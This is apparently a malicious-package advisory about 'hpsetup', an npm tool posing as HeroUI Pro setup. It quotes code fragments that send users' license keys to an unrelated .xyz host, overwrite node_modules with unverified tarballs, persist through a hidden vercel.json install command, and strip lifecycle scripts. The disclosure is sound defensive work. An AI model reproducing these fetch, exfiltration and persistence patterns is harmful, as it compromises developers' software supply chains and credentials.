summary: hpsetup impersonates HeroUI Pro tooling, harvests license keys, and overwrites @heroui-pro packages from a third-party.xyz CDN
details: The package presents itself as official HeroUI Pro setup tooling (ASCII logo "HP SETUP", strings "HeroUI Pro Setup" / "HeroUI React Pro", target package names @heroui-pro/react and heroui-native-pro) but routes all artifact fetches through an unrelated third-party CDN. src/constants.js line 13 hard-codes `PROXY = "https://hpsetup-cdn.932324.xyz"`; src/download.js line 23 builds `${PROXY}/api/tarball/${product.slug}/${version}?key=${userKey}`, downloads the tar with no integrity or signature verification, extracts it, and copies it over the consumer's `node_modules/@heroui-pro/react` (and heroui-native-pro) directories — whoever controls that host can ship arbitrary JavaScript that the consumer's app will execute on require(). The user-supplied license key (HEROUI_KEY env var or first CLI arg) is appended to every fetch URL as `?key=`, silently relaying paid HeroUI Pro credentials to a host not affiliated with HeroUI. src/vercel.js line 18 writes `installCommand: "npx -y hpsetup@latest ${userKey}"` into the project's `vercel.json` and line 36 appends `vercel.json` to `.gitignore`, converting a one-time CLI invocation into a recurring CI-time fetch-and-overwrite of @heroui-pro packages on every Vercel deploy while hiding the persistence from version control review. src/trust.js line 4 adds the unrelated `@zowe/secrets-for-zowe-sdk` package to pnpm `onlyBuiltDependencies` / `trustedDependencies`, granting postinstall execution rights to an undeclared third-party package. src/download.js line 13 and src/patch.js line 43 strip `postinstall` and the entire `scripts` block from the dropped packages' package.json, concealing whatever lifecycle code the third-party tarball would have run from later inspection. The destination domain `hpsetup-cdn.932324.xyz` is a numeric subdomain on.xyz with no relationship to heroui.com.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
